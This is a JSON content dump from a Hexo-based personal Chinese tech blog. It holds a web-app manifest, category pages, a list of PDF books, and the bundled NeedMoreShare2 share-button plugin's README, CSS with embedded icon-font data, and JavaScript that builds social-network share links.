{"meta":{"title":"BangZ's 梦工厂","subtitle":"FutureTech Research Center","description":null,"author":"BangZ","url":"https://hexo.bangz.me"},"pages":[{"title":"","date":"2021-11-26T18:32:03.315Z","updated":"2018-06-05T08:35:41.000Z","comments":true,"path":"manifest.json","permalink":"https://hexo.bangz.me/manifest.json","excerpt":"","text":"{\"name\":\"BangZ 梦工厂\",\"short_name\":\"BangZ\",\"theme_color\":\"#ee9600\",\"background_color\":\"#2196f3\",\"display\":\"fullscreen\",\"orientation\":\"portrait\",\"scope\":\"/\",\"start_url\":\"/\",\"icons\":[{\"src\":\"images/icons/icon-72x72.png\",\"sizes\":\"72x72\",\"type\":\"image/png\"},{\"src\":\"images/icons/icon-96x96.png\",\"sizes\":\"96x96\",\"type\":\"image/png\"},{\"src\":\"images/icons/icon-128x128.png\",\"sizes\":\"128x128\",\"type\":\"image/png\"},{\"src\":\"images/icons/icon-144x144.png\",\"sizes\":\"144x144\",\"type\":\"image/png\"},{\"src\":\"images/icons/icon-152x152.png\",\"sizes\":\"152x152\",\"type\":\"image/png\"},{\"src\":\"images/icons/icon-192x192.png\",\"sizes\":\"192x192\",\"type\":\"image/png\"},{\"src\":\"images/icons/icon-384x384.png\",\"sizes\":\"384x384\",\"type\":\"image/png\"},{\"src\":\"images/icons/icon-512x512.png\",\"sizes\":\"512x512\",\"type\":\"image/png\"}],\"splash_pages\":null}"},{"title":"","date":"2021-11-26T18:32:01.133Z","updated":"2018-06-13T07:23:03.000Z","comments":true,"path":"categories/index.html","permalink":"https://hexo.bangz.me/categories/index.html","excerpt":"","text":""},{"title":"个人 PDF 电子书列表","date":"2018-10-01T07:29:52.000Z","updated":"2022-01-25T09:32:43.578Z","comments":true,"path":"pdfs/index.html","permalink":"https://hexo.bangz.me/pdfs/index.html","excerpt":"","text":"数学类书籍 经典算法大全. pdf数学之美. pdf同济高等数学第六版上下册. pdf同济线性代数教材. pdf 工程类书籍 Google-Bigtable 中文版_1.0.pdfGoogle-File-System 中文版_1.0.pdfGoogle-MapReduce 中文版_1.0.pdf"},{"title":"","date":"2021-11-26T18:32:03.404Z","updated":"2018-06-13T07:22:46.000Z","comments":true,"path":"tags/index.html","permalink":"https://hexo.bangz.me/tags/index.html","excerpt":"","text":""},{"title":"其他","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"categories/其他/index.html","permalink":"https://hexo.bangz.me/categories/其他/index.html","excerpt":"","text":""},{"title":"实用工具","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"categories/实用工具/index.html","permalink":"https://hexo.bangz.me/categories/实用工具/index.html","excerpt":"","text":""},{"title":"技术研究","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"categories/技术研究/index.html","permalink":"https://hexo.bangz.me/categories/技术研究/index.html","excerpt":"","text":""},{"title":"日常运维","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"categories/日常运维/index.html","permalink":"https://hexo.bangz.me/categories/日常运维/index.html","excerpt":"","text":""},{"title":"项目开发","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"categories/项目开发/index.html","permalink":"https://hexo.bangz.me/categories/项目开发/index.html","excerpt":"","text":""},{"title":"","date":"2021-11-26T18:32:03.059Z","updated":"2018-06-07T11:03:49.000Z","comments":true,"path":"lib/needsharebutton/README.html","permalink":"https://hexo.bangz.me/lib/needsharebutton/README.html","excerpt":"","text":"NeedMoreShare2 for NexT Installation Step 1 &rarr; Go to NexT dir Change dir to NexT directory. There must be layout, source, languages and other directories: 123$ cd themes/next$ lsbower.json _config.yml docs gulpfile.coffee languages layout LICENSE.md package.json README.md scripts source test Step 2 &rarr; Get module Install module to source/lib directory: 1$ git clone https://github.com/theme-next/theme-next-needmoreshare2 source/lib/needsharebutton Step 3 &rarr; Set it up Enable module in NexT _config.yml file: 123456needmoreshare2: enable: true postbottom: enable: true float: enable: true Update 12$ cd themes/next/source/lib/needsharebutton$ git pull"},{"title":"","date":"2021-11-26T18:32:03.062Z","updated":"2018-06-07T11:03:49.000Z","comments":true,"path":"lib/needsharebutton/needsharebutton.css","permalink":"https://hexo.bangz.me/lib/needsharebutton/needsharebutton.css","excerpt":"","text":"/*********************************************** needShareButton - Version 1.0.0 - Copyright 2015 Dzmitry Vasileuski - Licensed under MIT (http://opensource.org/licenses/MIT) ***********************************************/ /* Social icons font ***********************************************/ /* SOCIAL ICON */ @font-face { font-family: 'social-icons'; font-weight: normal; font-style: normal; src: url('font/social.eot?44259375'); src: url('font/social.eot?44259375#iefix') format('embedded-opentype'), url('font/social.woff?44259375') format('woff'), url('font/social.ttf?44259375') format('truetype'), url('font/social.svg?44259375#social') format('svg'); } @font-face { font-family: 'social-icons'; src: url('data:application/font-woff;charset=utf-8;base64,') format('woff'), url('data:application/font-ttf;charset=utf-8;base64,') format('truetype'); } .need-share-button_dropdown [class^=\"social-\"]:before, .need-share-button_dropdown [class*=\"social-\"]:before { font-family: \"social-icons\"; font-style: normal; font-weight: normal; speak: none; display: inline-block; text-decoration: inherit; width: 1em; margin-right: .2em; text-align: center; /* opacity: .8; */ /* For safety - reset parent styles, that can break glyph codes*/ font-variant: normal; text-transform: none; /* fix buttons height, for twitter bootstrap */ line-height: 1em; /* Animation center compensation - margins should be symmetric */ /* remove if not needed */ margin-left: .2em; /* you can be more comfortable with increased icons size */ /* font-size: 120%; */ /* Uncomment for 3D effect */ /* text-shadow: 1px 1px 1px rgba(127, 127, 127, 0.3); */ } .social-mailto:before { content: '\\e80a'; } .social-twitter:before { content: '\\e813'; } .social-pinterest:before { content: '\\e80f'; } .social-facebook:before { content: '\\e80e'; } .social-googleplus:before { content: '\\e80d'; } .social-reddit:before { content: '\\e810'; } .social-linkedin:before { content: '\\e80c'; } .social-tumblr:before { content: '\\e812'; } .social-evernote:before { content: '\\e801'; } .social-delicious:before { content: '\\e815'; } .social-stumbleupon:before { content: '\\e811'; } .social-slashdot:before { content: '\\e806'; } .social-technorati:before { content: '\\e807'; } .social-posterous:before { content: '\\e809'; } .social-googlebookmarks:before { content: '\\e80b'; } .social-newsvine:before { content: '\\e803'; } .social-friendfeed:before { content: '\\e802'; } .social-vkontakte:before { content: '\\e814'; } .social-odnoklassniki:before { content: '\\e804'; } .social-mailru:before { content: '\\e800'; } /* FONTELLO ICON */ @font-face { font-family: 'fontello'; src: url('../font/fontello.eot?34242489'); src: url('../font/fontello.eot?34242489#iefix') format('embedded-opentype'), url('../font/fontello.svg?34242489#fontello') format('svg'); font-weight: normal; font-style: normal; } @font-face { font-family: 'fontello'; src: url('data:application/octet-stream;base64,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') format('woff'), url('data:application/octet-stream;base64,') format('truetype'); } /* Chrome hack: SVG is rendered more smooth in Windozze. 100% magic, uncomment if you need it. */ /* Note, that will break hinting! In other OS-es font will be not as sharp as it could be */ /* @media screen and (-webkit-min-device-pixel-ratio:0) { @font-face { font-family: 'fontello'; src: url('../font/fontello.svg?13586373#fontello') format('svg'); } } */ .need-share-button_dropdown [class^=\"icon-\"]:before, .need-share-button_dropdown [class*=\"icon-\"]:before { font-family: \"fontello\"; font-style: normal; font-weight: normal; speak: none; display: inline-block; text-decoration: inherit; width: 1em; margin-right: .2em; text-align: center; /* opacity: .8; */ /* For safety - reset parent styles, that can break glyph codes*/ font-variant: normal; text-transform: none; /* fix buttons height, for twitter bootstrap */ line-height: 1em; /* Animation center compensation - margins should be symmetric */ /* remove if not needed */ margin-left: .2em; /* you can be more comfortable with increased icons size */ /* font-size: 120%; */ /* Uncomment for 3D effect */ /* text-shadow: 1px 1px 1px rgba(127, 127, 127, 0.3); */ } .icon-weibo:before { content: '\\e82b'; } /* '' */ .icon-renren:before { content: '\\f18b'; } /* '' */ .icon-qqzone:before { content: '\\f1d6'; } /* '' */ .icon-wechat:before { content: '\\f1d7'; } /* '' */ /* Need Share Button ***********************************************/ .need-share-button { position: relative; } .need-share-button-opened { position: relative; } .need-share-button-opened img.need-share-wechat-code-image { display: block; width: 100%; max-width: 200px; margin: auto; } .need-share-button_dropdown { position: absolute; z-index: 10; visibility: hidden; overflow: hidden; width: 300px; font-size: 16px; -webkit-transition: .3s; transition: .3s; -webkit-transform: scale(.1); -ms-transform: scale(.1); transform: scale(.1); text-align: center; white-space: normal; opacity: 0; -webkit-border-radius: 4px; border-radius: 4px; background-color: #fff; -webkit-box-shadow: 0 0 2px rgba(0, 0, 0, .5); box-shadow: 0 0 2px rgba(0, 0, 0, .5); } .need-share-button-opened .need-share-button_dropdown { visibility: visible; -webkit-transform: scale(1); -ms-transform: scale(1); transform: scale(1); opacity: 1; } .need-share-button_dropdown-box-vertical, .need-share-button_dropdown-box-horizontal { -webkit-border-radius: 0; border-radius: 0; } .need-share-button_dropdown-box-vertical { width: 50px; } .need-share-button_dropdown-box-horizontal { width: auto; white-space: nowrap; } .need-share-button_link { display: inline-block; width: 50px; height: 50px; line-height: 50px; cursor: pointer; text-align: center; } .need-share-button_link:hover { -webkit-transition: .3s; transition: .3s; opacity: .7; } /* Dropdown position ***********************************************/ .need-share-button_dropdown-top-left { right: 100%; bottom: 100%; margin-right: 10px; margin-bottom: 10px; } .need-share-button_dropdown-top-right { bottom: 100%; left: 100%; margin-bottom: 10px; margin-left: 10px; } .need-share-button_dropdown-top-center { bottom: 100%; left: 50%; margin-bottom: 10px; } .need-share-button_dropdown-middle-left { top: 50%; right: 100%; margin-right: 10px; } .need-share-button_dropdown-middle-right { bottom: 0; left: 100%; margin-left: 10px; } .need-share-button_dropdown-bottom-left { top: 100%; right: 100%; margin-top: 10px; margin-right: 10px; } .need-share-button_dropdown-bottom-right { top: 100%; left: 100%; margin-top: 10px; margin-left: 10px; } .need-share-button_dropdown-bottom-center { top: 100%; left: 50%; margin-top: 10px; } /* Default theme ***********************************************/ .need-share-button-default { display: inline-block; margin-bottom: 0; padding: 6px 12px; font-size: 14px; line-height: 1.42857143; font-weight: 400; color: #333; cursor: pointer; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; text-align: center; vertical-align: middle; border: 1px solid #ccc; -webkit-border-radius: 4px; border-radius: 4px; background-color: #fff; } /* Network buttons ***********************************************/ .need-share-button_wechat { color: #a2dc30; } .need-share-button_wechat.need-share-button_link-box { color: #fff; background: #a2dc30; } .need-share-button_weibo { color: #d52b2b; } .need-share-button_weibo.need-share-button_link-box { color: #fff; background: #d52b2b; } .need-share-button_douban { color: #072; } .need-share-button_douban:before { content: '豆'; } .need-share-button_douban.need-share-button_link-box { color: #fff; background: #072; } .need-share-button_qqzone { color: #ffce00; } .need-share-button_qqzone.need-share-button_link-box { color: #fff; background: #ffce00; } .need-share-button_renren { color: #207cc5; } .need-share-button_renren.need-share-button_link-box { color: #fff; background: #207cc5; } .need-share-button_mailto { color: #efbe00; } .need-share-button_mailto.need-share-button_link-box { color: #fff; background: #efbe00; } .need-share-button_twitter { color: #00acec; } .need-share-button_twitter.need-share-button_link-box { color: #fff; background: #00acec; } .need-share-button_pinterest { color: #cd2027; } .need-share-button_pinterest.need-share-button_link-box { color: #fff; background: #cd2027; } .need-share-button_facebook { color: #3b5998; } .need-share-button_facebook.need-share-button_link-box { color: #fff; background: #3b5998; } .need-share-button_googleplus { color: #d44132; } .need-share-button_googleplus.need-share-button_link-box { color: #fff; background: #d44132; } .need-share-button_reddit { color: #000; } .need-share-button_reddit.need-share-button_link-box { color: #fff; background: #000; } .need-share-button_delicious { color: #000; } .need-share-button_delicious.need-share-button_link-box { color: #fff; background: #000; } .need-share-button_stumbleupon { color: #f04e23; } .need-share-button_stumbleupon.need-share-button_link-box { color: #fff; background: #f04e23; } .need-share-button_linkedin { color: #0085af; } .need-share-button_linkedin.need-share-button_link-box { color: #fff; background: #0085af; } .need-share-button_slashdot { color: #026664; } .need-share-button_slashdot.need-share-button_link-box { color: #fff; background: #026664; } .need-share-button_technorati { color: #49ae47; } .need-share-button_technorati.need-share-button_link-box { color: #fff; background: #49ae47; } .need-share-button_posterous { color: #795d31; } .need-share-button_posterous.need-share-button_link-box { color: #fff; background: #795d31; } .need-share-button_tumblr { color: #34465d; } .need-share-button_tumblr.need-share-button_link-box { color: #fff; background: #34465d; } .need-share-button_googlebookmarks { color: #fde331; } .need-share-button_googlebookmarks.need-share-button_link-box { color: #fff; background: #fde331; } .need-share-button_newsvine { color: #03652c; } .need-share-button_newsvine.need-share-button_link-box { color: #fff; background: #03652c; } .need-share-button_evernote { color: #79d626; } .need-share-button_evernote.need-share-button_link-box { color: #fff; background: #79d626; } .need-share-button_friendfeed { color: #b0cbe9; } .need-share-button_friendfeed.need-share-button_link-box { color: #fff; background: #b0cbe9; } .need-share-button_vkontakte { color: #4c75a3; } .need-share-button_vkontakte.need-share-button_link-box { color: #fff; background: #4c75a3; } .need-share-button_odnoklassniki { color: #ed812b; } .need-share-button_odnoklassniki.need-share-button_link-box { color: #fff; background: #ed812b; } .need-share-button_mailru { color: #f89c0e; } .need-share-button_mailru.need-share-button_link-box { color: #fff; background: #f89c0e; }"},{"title":"","date":"2021-11-26T18:32:03.066Z","updated":"2018-06-07T11:03:49.000Z","comments":true,"path":"lib/needsharebutton/needsharebutton.js","permalink":"https://hexo.bangz.me/lib/needsharebutton/needsharebutton.js","excerpt":"","text":"/*********************************************** needShareButton - Version 1.0.0 - Copyright 2015 Dzmitry Vasileuski - Licensed under MIT (http://opensource.org/licenses/MIT) ***********************************************/ (function () { // find closest function closest(elem, parent) { if (typeof (parent) == \"string\") { var matchesSelector = elem.matches || elem.webkitMatchesSelector || elem.mozMatchesSelector || elem.msMatchesSelector; if (!!matchesSelector) { while (elem) { if (matchesSelector.bind(elem)(parent)) { return elem; } else { elem = elem.parentElement; } } } return false; } else { while (elem) { if (elem == parent) { return elem; } else { elem = elem.parentElement; } } return false; } } // share button class window.needShareButton = function (elem, options) { // create element reference var root = this; root.elem = elem || \"need-share-button\"; /* Helpers ***********************************************/ // get title from html root.getTitle = function () { var content; // check querySelector existance for old browsers if (document.querySelector) { content = document.querySelector(\"title\"); if (content) { return content.innerText; } } return document.title; }; // get image from html root.getImage = function () { var content; // check querySelector existance for old browsers if (document.querySelector) { content = document.querySelector(\"meta[property=\\\"og:image\\\"]\") || document.querySelector(\"meta[name=\\\"twitter:image\\\"]\"); if (content) { return content.getAttribute(\"content\"); } else { return \"\"; } } else { return \"\"; } }; // get description from html root.getDescription = function () { var content; // check querySelector existance for old browsers if (document.querySelector) { content = document.querySelector(\"meta[property=\\\"og:description\\\"]\") || document.querySelector(\"meta[name=\\\"twitter:description\\\"]\") || document.querySelector(\"meta[name=\\\"description\\\"]\"); if (content) { return content.getAttribute(\"content\"); } else { return \"\"; } } else { content = document.getElementsByTagName(\"meta\").namedItem(\"description\"); if (content) { return content.getAttribute(\"content\"); } else { return \"\"; } } }; // share urls for all networks root.share = { \"weibo\": function (el) { var myoptions = getOptions(el); var url = \"http://v.t.sina.com.cn/share/share.php?title=\" + encodeURIComponent(myoptions.title) + \"&url=\" + encodeURIComponent(myoptions.url) + \"&pic=\" + encodeURIComponent(myoptions.image); root.popup(url); }, \"wechat\": function (el) { var myoptions = getOptions(el); var imgSrc = \"http://api.qrserver.com/v1/create-qr-code/?size=150x150&data=\" + encodeURIComponent(myoptions.url); var dropdownEl = el.querySelector(\".need-share-button_dropdown\"); var img = dropdownEl.getElementsByClassName(\"need-share-wechat-code-image\")[0]; if (img) { img.remove(); } else { img = document.createElement(\"img\"); img.src = imgSrc; img.alt = \"loading wechat image...\"; img.setAttribute(\"class\", \"need-share-wechat-code-image\"); if (root.options.position == 'middleRight') { dropdownEl.insertBefore(img, dropdownEl.children[0]); } else { dropdownEl.appendChild(img); } } }, \"douban\": function (el) { var myoptions = getOptions(el); var url = \"https://www.douban.com/share/service?name=\" + encodeURIComponent(myoptions.title) + \"&href=\" + encodeURIComponent(myoptions.url) + \"&image=\" + encodeURIComponent(myoptions.image); root.popup(url); }, \"qqzone\": function (el) { var myoptions = getOptions(el); var url = \"http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?title=\" + encodeURIComponent(myoptions.title) + \"&url=\" + encodeURIComponent(myoptions.url) + \"&pics=\" + encodeURIComponent(myoptions.image) + \"&desc=\" + encodeURIComponent(myoptions.description); root.popup(url); }, \"renren\": function (el) { var myoptions = getOptions(el); var url = \"http://widget.renren.com/dialog/share?title=\" + encodeURIComponent(myoptions.title) + \"&resourceUrl=\" + encodeURIComponent(myoptions.url) + \"&pic=\" + encodeURIComponent(myoptions.image) + \"&description=\" + encodeURIComponent(myoptions.description); root.popup(url); }, \"mailto\": function (el) { var myoptions = getOptions(el); var url = \"mailto:?subject=\" + encodeURIComponent(myoptions.title) + \"&body=Thought you might enjoy reading this:\" + encodeURIComponent(myoptions.url) + \"-\" + encodeURIComponent(myoptions.description); window.location.href = url; }, \"twitter\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"twitter.com/intent/tweet?text=\"; url += encodeURIComponent(myoptions.title) + \"&url=\" + encodeURIComponent(myoptions.url); root.popup(url); }, \"pinterest\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"pinterest.com/pin/create/bookmarklet/?is_video=false\"; url += \"&media=\" + encodeURIComponent(myoptions.image); url += \"&url=\" + encodeURIComponent(myoptions.url); url += \"&description=\" + encodeURIComponent(myoptions.title); root.popup(url); }, \"facebook\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"www.facebook.com/share.php?\"; url += \"u=\" + encodeURIComponent(myoptions.url); url += \"&title=\" + encodeURIComponent(myoptions.title); root.popup(url); }, \"googleplus\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"plus.google.com/share?\"; url += \"url=\" + encodeURIComponent(myoptions.url); root.popup(url); }, \"reddit\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"www.reddit.com/submit?\"; url += \"url=\" + encodeURIComponent(myoptions.url); url += \"&title=\" + encodeURIComponent(myoptions.title); root.popup(url); }, \"delicious\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"del.icio.us/post?\"; url += \"url=\" + encodeURIComponent(myoptions.url); url += \"&title=\" + encodeURIComponent(myoptions.title); url += \"&notes=\" + encodeURIComponent(myoptions.description); root.popup(url); }, \"stumbleupon\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"www.stumbleupon.com/submit?\"; url += \"url=\" + encodeURIComponent(myoptions.url); url += \"&title=\" + encodeURIComponent(myoptions.title); root.popup(url); }, \"linkedin\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"www.linkedin.com/shareArticle?mini=true\"; url += \"&url=\" + encodeURIComponent(myoptions.url); url += \"&title=\" + encodeURIComponent(myoptions.title); url += \"&source=\" + encodeURIComponent(myoptions.source); root.popup(url); }, \"slashdot\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"slashdot.org/bookmark.pl?\"; url += \"url=\" + encodeURIComponent(myoptions.url); url += \"&title=\" + encodeURIComponent(myoptions.title); root.popup(url); }, \"technorati\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"technorati.com/faves?\"; url += \"add=\" + encodeURIComponent(myoptions.url); url += \"&title=\" + encodeURIComponent(myoptions.title); root.popup(url); }, \"posterous\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"posterous.com/share?\"; url += \"linkto=\" + encodeURIComponent(myoptions.url); root.popup(url); }, \"tumblr\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"www.tumblr.com/share?v=3\"; url += \"&u=\" + encodeURIComponent(myoptions.url); url += \"&t=\" + encodeURIComponent(myoptions.title); root.popup(url); }, \"googlebookmarks\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"www.google.com/bookmarks/mark?op=edit\"; url += \"&bkmk=\" + encodeURIComponent(myoptions.url); url += \"&title=\" + encodeURIComponent(myoptions.title); url += \"&annotation=\" + encodeURIComponent(myoptions.description); root.popup(url); }, \"newsvine\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"www.newsvine.com/_tools/seed&save?\"; url += \"u=\" + encodeURIComponent(myoptions.url); url += \"&h=\" + encodeURIComponent(myoptions.title); root.popup(url); }, 